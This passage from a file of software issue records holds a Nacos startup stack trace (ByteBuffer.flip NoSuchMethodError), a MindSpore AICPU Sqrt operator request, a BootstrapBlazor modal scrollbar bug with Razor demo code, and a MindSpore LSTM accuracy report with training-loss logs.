nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1372) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1222) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.SinbreakNacosApplication.main(SinbreakNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 19 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:656) ... 34 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:656) ... 50 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:440) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1796) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:620) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:656) ... 64 common frames omitted Caused by: java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at com.alibaba.nacos.sys.utils.DiskUtils.readFile(DiskUtils.java:188) at com.alibaba.nacos.core.remote.ConnectionManager.loadRuleFromLocal(ConnectionManager.java:699) at com.alibaba.nacos.core.remote.ConnectionManager.initLimitRue(ConnectionManager.java:119) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 76 common frames omitted 2022-01-13 15:17:42.416 WARN 18108 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start close 2022-01-13 15:17:42.416 WARN 18108 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\think\nacos\conf 2022-01-13 15:17:42.416 WARN 18108 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\think\nacos\data\tps 2022-01-13 15:17:42.416 WARN 18108 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] already closed 2022-01-13 15:17:42.417 WARN 18108 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Start destroying Publisher 2022-01-13 15:17:42.417 WARN 18108 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Destruction of the end 2022-01-13 15:17:42.417 ERROR 18108 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos failed to start, please see C:\Users\think\nacos\logs\nacos.log for more details. 2022-01-13 15:17:42.430 INFO 18108 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2022-01-13 15:17:42.461 ERROR 18108 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'memoryMonitor' defined in URL [jar:file:/C:/Users/think/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar!/com/alibaba/nacos/config/server/monitor/MemoryMonitor.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1372) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1222) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.SinbreakNacosApplication.main(SinbreakNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 19 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:656) ... 34 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:656) ... 50 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:440) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1796) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:620) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.spring   <code>: ,--. ,--.'| --.' ./ Console: http://10.147.18.66:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ ----. \ | | ' --' / ' : | ; : .' \ : : --'---' '---' ---'"
【众智】【计算-AICPU接入】Sqrt,"AICPU算子接入 基础复数算子，平方根 x y 对应底层算子 对应底层AI CPU算子Sqrt Classify Name Type Type Range Required Format INPUT x fp16, fp32, double, complex64, complex128 TRUE OUTPUT y fp16, fp32, double, complex64, complex128 TRUE 标杆接口参考 TF接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/Sqrt 3. 异常处理 4. 算子反向 参考TF反向函数_SqrtGrad tensorflow/tensorflow/python/ops/math_grad.py _SqrtGrad   <code>: class Sqrt(Primitive):"
Model组件 全屏模式下内容超出时没有显示滚动条,"以下是UI FirstPaneTemplate内容超出，在全屏模式下不显示滚动条 补充内容： 开发工具：Visual Studio 2022 demo: Index.razor Index.razor.cs 运行截图：   <code>: &lt;Model @ref=""@TestModel""&gt; &lt;ModelDialog ... IsScrolling=""true""&gt; &lt;BodyTemplate&gt; &lt;Split&gt; &lt;FirstPaneTemplate&gt; &lt;ListView ... IsVertical=""true""&gt; ... &lt;ListView&gt; &lt;/FirstPaneTemplate&gt; &lt;SecondPaneTemplate&gt; &lt;ValidateForm ...&gt; &lt;EditorForm ...&gt; ... &lt;/EditorForm&gt; &lt;/ValidateForm&gt; &lt;/SecondPaneTemplate&gt; &lt;Split&gt; &lt;/BodyTemplate&gt; &lt;/ModelDialog&gt; &lt;/Model&gt; @page ""/"" &lt;PageTitle&gt;Index&lt;/PageTitle&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; Welcome to your new app. &lt;SurveyPrompt Title=""How is Blazor working for you?"" /&gt; &lt;Button Text=""TEST"" OnClick=""OnClick"" /&gt; @{ void OnClick() { TestModal.Toggle(); } } &lt;Modal @ref=""@TestModal"" IsKeyboard=""true""&gt; &lt;ModalDialog Title=""TEST"" IsCentered=""true"" ShowMaximizeButton=""true"" FullScreenSize=""FullScreenSize.Always"" ShowHeaderCloseButton=""true"" IsScrolling=""true""&gt; &lt;BodyTemplate&gt; &lt;Split&gt; &lt;FirstPaneTemplate&gt; &lt;GroupBox Title=""ListView"" style='padding:10px;margin:10px;'&gt; &lt;ListView TItem=""Foo"" Items=""@FooList"" IsVertical=""true""&gt; &lt;BodyTemplate&gt; &lt;Textarea @bind-Value=""context.Name"" Readonly=""true"" ShowLabel=""true"" DisplayText=""@context.Id.ToString()"" /&gt; &lt;/BodyTemplate&gt; &lt;/ListView&gt; &lt;/GroupBox&gt; &lt;/FirstPaneTemplate&gt; &lt;SecondPaneTemplate&gt; &lt;div style='padding:10px;'&gt; &lt;ValidateForm Model=""FooModel""&gt; &lt;GroupBox Title=""Form""&gt; &lt;Row ItemsPerRow=""ItemsPerRow.Two""&gt; &lt;BootstrapInputNumber @bind-Value=""@FooModel.Id"" ShowLabel=""true"" DisplayText=""ID"" /&gt; &lt;BootstrapInput @bind-Value=""@FooModel.Name"" ShowLabel=""true"" DisplayText=""Name"" /&gt; &lt;/Row&gt; &lt;/GroupBox&gt; &lt;Button ButtonType=""ButtonType.Submit"" Icon=""fa fa-floppy-disk"" Text=""保存"" /&gt; &lt;/ValidateForm&gt; &lt;/div&gt; &lt;/SecondPaneTemplate&gt; &lt;/Split&gt; &lt;/BodyTemplate&gt; &lt;/ModalDialog&gt; &lt;/Modal&gt; using BootstrapBlazor.Components; namespace BlazorApp1.Pages { public partial class Index { Modal TestModal { get; set; } List&lt;Foo&gt; FooList { get; set; } = Enumerable.Range(1, 40).Select(i =&gt; new Foo { Id = i, Name = Guid.NewGuid().ToString() }).ToList(); Foo FooModel { get; set; } = new Foo(); } public class Foo { public int Id { get; set; } public string Name { get; set; } } }"
[ST][MS][NET][LSTM][CPU]Accuracy[49.7%] can not reach 83%,"LSTM网络在CPU环境训练，推理精度49.7%达不到83%，loss不收敛 / 硬件环境: /device CPU : -- MindSpore version :r1.8.0 commit_id:ac72a96d -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_lstm_aclimdb_train_infer_cpu_0001.py cd solution_test/cases/02network/02nlp/lstm/train pytest -s test_ms_lstm_aclimdb_train_infer_cpu_0001.py 网络训练成功，loss收敛，推理精度能达到83% 走给梁浩   <code>: epoch: 1 step: 1, loss is 0.6926370859146118 epoch: 1 step: 2, loss is 0.6954860091209412 epoch: 1 step: 3, loss is 0.6936604380607605 epoch: 1 step: 4, loss is 0.6924052238464355 epoch: 1 step: 5, loss is 0.6925051212310791 epoch: 1 step: 6, loss is 0.6931380033493042 epoch: 1 step: 7, loss is 0.6956802010536194 epoch: 1 step: 8, loss is 0.6935598254203796 epoch: 1 step: 9, loss is 0.6924713253974915 epoch: 1 step: 10, loss is 0.6958215236663818 epoch: 1 step: 11, loss is 0.6898153424263 ... epoch: 20 step: 382, loss is 0.6974558234214783 epoch: 20 step: 383, loss is 0.6970478296279907 epoch: 20 step: 384, loss is 